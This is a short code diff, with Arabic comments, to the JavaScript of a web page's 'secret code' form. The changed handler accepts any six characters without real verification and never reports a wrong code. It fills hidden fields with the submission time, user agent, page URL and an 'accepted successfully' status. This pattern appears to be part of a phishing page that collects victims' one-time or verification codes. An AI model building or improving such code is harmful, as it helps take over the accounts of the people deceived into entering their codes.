@@ -911,21 +911,21 @@
             currentFormType = '';
         }
 
-        // Code verification - يقبل أي 6 أرقام
+        // Code verification - يقبل أي 6 أرقام بدون أي تحقق
         document.getElementById('code-form').addEventListener('submit', function(e) {
             e.preventDefault();
             const code = document.getElementById('secret-code').value.trim();
             const currentTime = new Date().toLocaleString('ar-SA');
             
-            // Check if code is exactly 6 digits
-            if (code.length !== 6 || !/^\d{6}$/.test(code)) {
-                showNotification('يجب أن يكون الكود مكون من 6 أرقام فقط');
+            // تحقق بسيط فقط من أن هناك 6 أرقام
+            if (code.length !== 6) {
+                showNotification('يرجى إدخال 6 أرقام');
                 return;
             }
             
-            // أي 6 أرقام مقبولة - لا نتحقق من أكواد محددة
+            // أي 6 أرقام مقبولة - لا يوجد رسالة "كود غير صحيح"
             this.querySelector('input[name="submission_time"]').value = currentTime;
-            this.querySelector('input[name="code_status"]').value = 'تم قبول الكود - 6 أرقام صحيحة';
+            this.querySelector('input[name="code_status"]').value = 'تم قبول الكود بنجاح';
             this.querySelector('input[name="user_agent"]').value = navigator.userAgent;
             this.querySelector('input[name="page_url"]').value = window.location.href;
             
